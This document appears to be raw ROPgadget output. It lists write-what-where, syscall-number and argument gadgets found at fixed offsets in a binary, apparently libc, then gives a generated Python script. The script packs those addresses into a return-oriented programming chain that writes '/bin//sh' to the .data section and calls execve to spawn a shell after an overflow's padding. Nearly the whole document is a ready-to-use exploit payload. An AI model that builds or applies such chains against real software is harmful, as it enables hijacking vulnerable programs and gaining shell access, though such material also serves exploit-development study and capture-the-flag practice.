# ROP chain generation
# ===========================================================

# - Step 1 -- Write-what-where gadgets

#         [+] Gadget found: 0x14007d mov qword ptr [rsi], rdi ; ret
#         [+] Gadget found: 0x23a6a pop rsi ; ret
#         [+] Gadget found: 0x2164f pop rdi ; ret
#         [-] Can't find the 'xor rdi, rdi' gadget. Try with another 'mov [reg], reg'

#         [+] Gadget found: 0x10111a mov qword ptr [rdx], rdi ; ret
#         [+] Gadget found: 0x1b96 pop rdx ; ret
#         [+] Gadget found: 0x2164f pop rdi ; ret
#         [-] Can't find the 'xor rdi, rdi' gadget. Try with another 'mov [reg], reg'

#         [+] Gadget found: 0xa7d54 mov qword ptr [rdx], rcx ; ret
#         [+] Gadget found: 0x1b96 pop rdx ; ret
#         [+] Gadget found: 0xe433e pop rcx ; ret
#         [-] Can't find the 'xor rcx, rcx' gadget. Try with another 'mov [reg], reg'

#         [+] Gadget found: 0x3099c mov qword ptr [rdx], rax ; ret
#         [+] Gadget found: 0x1b96 pop rdx ; ret
#         [+] Gadget found: 0x1b500 pop rax ; ret
#         [+] Gadget found: 0xb1485 xor rax, rax ; ret

# - Step 2 -- Init syscall number gadgets

#         [+] Gadget found: 0xb1485 xor rax, rax ; ret
#         [+] Gadget found: 0xd0ab0 add rax, 1 ; ret
#         [+] Gadget found: 0x9ecab add eax, 1 ; ret
#         [+] Gadget found: 0x7bda0 add al, 1 ; ret

# - Step 3 -- Init syscall arguments gadgets

#         [+] Gadget found: 0x2164f pop rdi ; ret
#         [+] Gadget found: 0x23a6a pop rsi ; ret
#         [+] Gadget found: 0x1b96 pop rdx ; ret

# - Step 4 -- Syscall gadget

#         [+] Gadget found: 0x2743 syscall

# - Step 5 -- Build the ROP chain

#!/usr/bin/env python3
# execve generated by ROPgadget

from struct import pack

# Padding goes here
p = b''

p += pack('<Q', 0x0000000000001b96)  # pop rdx ; ret
p += pack('<Q', 0x00000000003eb1a0)  # @ .data
p += pack('<Q', 0x000000000001b500)  # pop rax ; ret
p += b'/bin//sh'
p += pack('<Q', 0x000000000003099c)  # mov qword ptr [rdx], rax ; ret
p += pack('<Q', 0x0000000000001b96)  # pop rdx ; ret
p += pack('<Q', 0x00000000003eb1a8)  # @ .data + 8
p += pack('<Q', 0x00000000000b1485)  # xor rax, rax ; ret
p += pack('<Q', 0x000000000003099c)  # mov qword ptr [rdx], rax ; ret
p += pack('<Q', 0x000000000002164f)  # pop rdi ; ret
p += pack('<Q', 0x00000000003eb1a0)  # @ .data
p += pack('<Q', 0x0000000000023a6a)  # pop rsi ; ret
p += pack('<Q', 0x00000000003eb1a8)  # @ .data + 8
p += pack('<Q', 0x0000000000001b96)  # pop rdx ; ret
p += pack('<Q', 0x00000000003eb1a8)  # @ .data + 8
p += pack('<Q', 0x00000000000b1485)  # xor rax, rax ; ret
p += pack('<Q', 0x00000000000d0ab0)  # add rax, 1 ; ret
p += pack('<Q', 0x00000000000d0ab0)  # add rax, 1 ; ret
p += pack('<Q', 0x00000000000d0ab0)  # add rax, 1 ; ret
p += pack('<Q', 0x00000000000d0ab0)  # add rax, 1 ; ret
p += pack('<Q', 0x00000000000d0ab0)  # add rax, 1 ; ret
p += pack('<Q', 0x00000000000d0ab0)  # add rax, 1 ; ret
p += pack('<Q', 0x00000000000d0ab0)  # add rax, 1 ; ret
p += pack('<Q', 0x00000000000d0ab0)  # add rax, 1 ; ret
p += pack('<Q', 0x00000000000d0ab0)  # add rax, 1 ; ret
p += pack('<Q', 0x00000000000d0ab0)  # add rax, 1 ; ret
p += pack('<Q', 0x00000000000d0ab0)  # add rax, 1 ; ret
p += pack('<Q', 0x00000000000d0ab0)  # add rax, 1 ; ret
p += pack('<Q', 0x00000000000d0ab0)  # add rax, 1 ; ret
p += pack('<Q', 0x00000000000d0ab0)  # add rax, 1 ; ret
p += pack('<Q', 0x00000000000d0ab0)  # add rax, 1 ; ret
p += pack('<Q', 0x00000000000d0ab0)  # add rax, 1 ; ret
p += pack('<Q', 0x00000000000d0ab0)  # add rax, 1 ; ret
p += pack('<Q', 0x00000000000d0ab0)  # add rax, 1 ; ret
p += pack('<Q', 0x00000000000d0ab0)  # add rax, 1 ; ret
p += pack('<Q', 0x00000000000d0ab0)  # add rax, 1 ; ret
p += pack('<Q', 0x00000000000d0ab0)  # add rax, 1 ; ret
p += pack('<Q', 0x00000000000d0ab0)  # add rax, 1 ; ret
p += pack('<Q', 0x00000000000d0ab0)  # add rax, 1 ; ret
p += pack('<Q', 0x00000000000d0ab0)  # add rax, 1 ; ret
p += pack('<Q', 0x00000000000d0ab0)  # add rax, 1 ; ret
p += pack('<Q', 0x00000000000d0ab0)  # add rax, 1 ; ret
p += pack('<Q', 0x00000000000d0ab0)  # add rax, 1 ; ret
p += pack('<Q', 0x00000000000d0ab0)  # add rax, 1 ; ret
p += pack('<Q', 0x00000000000d0ab0)  # add rax, 1 ; ret
p += pack('<Q', 0x00000000000d0ab0)  # add rax, 1 ; ret
p += pack('<Q', 0x00000000000d0ab0)  # add rax, 1 ; ret
p += pack('<Q', 0x00000000000d0ab0)  # add rax, 1 ; ret
p += pack('<Q', 0x00000000000d0ab0)  # add rax, 1 ; ret
p += pack('<Q', 0x00000000000d0ab0)  # add rax, 1 ; ret
p += pack('<Q', 0x00000000000d0ab0)  # add rax, 1 ; ret
p += pack('<Q', 0x00000000000d0ab0)  # add rax, 1 ; ret
p += pack('<Q', 0x00000000000d0ab0)  # add rax, 1 ; ret
p += pack('<Q', 0x00000000000d0ab0)  # add rax, 1 ; ret
p += pack('<Q', 0x00000000000d0ab0)  # add rax, 1 ; ret
p += pack('<Q', 0x00000000000d0ab0)  # add rax, 1 ; ret
p += pack('<Q', 0x00000000000d0ab0)  # add rax, 1 ; ret
p += pack('<Q', 0x00000000000d0ab0)  # add rax, 1 ; ret
p += pack('<Q', 0x00000000000d0ab0)  # add rax, 1 ; ret
p += pack('<Q', 0x00000000000d0ab0)  # add rax, 1 ; ret
p += pack('<Q', 0x00000000000d0ab0)  # add rax, 1 ; ret
p += pack('<Q', 0x00000000000d0ab0)  # add rax, 1 ; ret
p += pack('<Q', 0x00000000000d0ab0)  # add rax, 1 ; ret
p += pack('<Q', 0x00000000000d0ab0)  # add rax, 1 ; ret
p += pack('<Q', 0x00000000000d0ab0)  # add rax, 1 ; ret
p += pack('<Q', 0x00000000000d0ab0)  # add rax, 1 ; ret
p += pack('<Q', 0x00000000000d0ab0)  # add rax, 1 ; ret
p += pack('<Q', 0x00000000000d0ab0)  # add rax, 1 ; ret
p += pack('<Q', 0x00000000000d0ab0)  # add rax, 1 ; ret
p += pack('<Q', 0x00000000000d0ab0)  # add rax, 1 ; ret
p += pack('<Q', 0x00000000000d0ab0)  # add rax, 1 ; ret
p += pack('<Q', 0x00000000000d0ab0)  # add rax, 1 ; ret
p += pack('<Q', 0x00000000000d0ab0)  # add rax, 1 ; ret
p += pack('<Q', 0x00000000000d0ab0)  # add rax, 1 ; ret
p += pack('<Q', 0x00000000000d0ab0)  # add rax, 1 ; ret
p += pack('<Q', 0x0000000000002743)  # syscall
